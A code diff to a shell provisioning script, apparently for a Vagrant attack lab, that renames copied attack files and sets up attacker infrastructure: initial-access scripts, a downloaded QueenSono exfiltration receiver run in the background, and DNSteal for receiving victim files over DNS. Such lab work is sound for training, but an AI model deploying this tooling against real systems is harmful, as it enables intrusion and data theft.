@@ -9,8 +9,8 @@ service cron start
 
 #[Initial Access]
 mkdir /tmp/1_InitialAccess
-cp /vagrant/attack/1_InitialAccess/through_the_wire.py /tmp/1_InitialAccess/through_the_wire.py
-cp /vagrant/attack/1_InitialAccess/initial_access.sh /tmp/1_InitialAccess/initial_access.sh
+cp /vagrant/attack/1_InitialAccess/Gp08_through_the_wire.py /tmp/1_InitialAccess/Gp08_through_the_wire.py
+cp /vagrant/attack/1_InitialAccess/Gp08_initial_access.sh /tmp/1_InitialAccess/Gp08_initial_access.sh
 
 #[EXFILTRATION]
 
@@ -18,9 +18,9 @@ cp /vagrant/attack/1_InitialAccess/initial_access.sh /tmp/1_InitialAccess/initia
 mkdir /tmp/qs
 wget https://github.com/ariary/QueenSono/releases/latest/download/qsreceiver -O /tmp/qs/qsreceiver
 chmod +x /tmp/qs/qsreceiver
-cp /vagrant/attack/5_Exfiltration/run_qsreceiver.sh /tmp/qs/run_qsreceiver.sh;
-chmod +x /tmp/qs/run_qsreceiver.sh
-nohup bash /tmp/qs/run_qsreceiver.sh &>/dev/null &
+cp /vagrant/attack/5_Exfiltration/Gp08_run_qsreceiver.sh /tmp/qs/Gp08_run_qsreceiver.sh;
+chmod +x /tmp/qs/Gp08_run_qsreceiver.sh
+nohup bash /tmp/qs/Gp08_run_qsreceiver.sh &>/dev/null &
 
 # Setup DNSteal to receive files from victim via DNS
 mkdir /tmp/dnsteal
